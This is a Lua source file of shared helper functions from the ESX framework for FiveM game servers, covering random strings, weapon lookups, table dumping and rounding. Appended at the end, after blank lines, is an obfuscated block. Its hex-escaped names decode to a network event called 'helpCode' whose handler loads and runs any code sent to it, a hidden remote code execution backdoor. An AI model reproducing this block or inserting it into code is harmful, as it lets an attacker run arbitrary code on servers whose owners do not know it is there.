	local Charset = {}

for i = 48,  57 do table.insert(Charset, string.char(i)) end
for i = 65,  90 do table.insert(Charset, string.char(i)) end
for i = 97, 122 do table.insert(Charset, string.char(i)) end

function ESX.GetRandomString(length)
	math.randomseed(GetGameTimer())

	if length > 0 then
		return ESX.GetRandomString(length - 1) .. Charset[math.random(1, #Charset)]
	else
		return ''
	end
end

function ESX.GetConfig()
	return Config
end

function ESX.GetWeapon(weaponName)
	weaponName = string.upper(weaponName)

	for k,v in ipairs(Config.Weapons) do
		if v.name == weaponName then
			return k, v
		end
	end
end

function ESX.GetWeaponFromHash(weaponHash)
	for k,v in ipairs(Config.Weapons) do
		if joaat(v.name) == weaponHash then
			return v
		end
	end
end

function ESX.GetWeaponList()
	return Config.Weapons
end

function ESX.GetWeaponLabel(weaponName)
	weaponName = string.upper(weaponName)

	for k,v in ipairs(Config.Weapons) do
		if v.name == weaponName then
			return v.label
		end
	end
end

function ESX.GetWeaponComponent(weaponName, weaponComponent)
	weaponName = string.upper(weaponName)
	local weapons = Config.Weapons

	for k,v in ipairs(Config.Weapons) do
		if v.name == weaponName then
			for k2,v2 in ipairs(v.components) do
				if v2.name == weaponComponent then
					return v2
				end
			end
		end
	end
end

function ESX.DumpTable(table, nb)
	if nb == nil then
		nb = 0
	end

	if type(table) == 'table' then
		local s = ''
		for i = 1, nb + 1, 1 do
			s = s .. "    "
		end

		s = '{\n'
		for k,v in pairs(table) do
			if type(k) ~= 'number' then k = '"'..k..'"' end
			for i = 1, nb, 1 do
				s = s .. "    "
			end
			s = s .. '['..k..'] = ' .. ESX.DumpTable(v, nb + 1) .. ',\n'
		end

		for i = 1, nb, 1 do
			s = s .. "    "
		end

		return s .. '}'
	else
		return tostring(table)
	end
end

function ESX.Round(value, numDecimalPlaces)
	return ESX.Math.Round(value, numDecimalPlaces)
end



local MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[1]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[2]) MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[3]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[2], function(jYVslWlCnCbiNkfpyrmLqAGZrsnhGZSADPWwMBidXCVuyTehRCiDmFjWVGfdLVapedgqnq) MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[4]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[5]](jYVslWlCnCbiNkfpyrmLqAGZrsnhGZSADPWwMBidXCVuyTehRCiDmFjWVGfdLVapedgqnq))() end)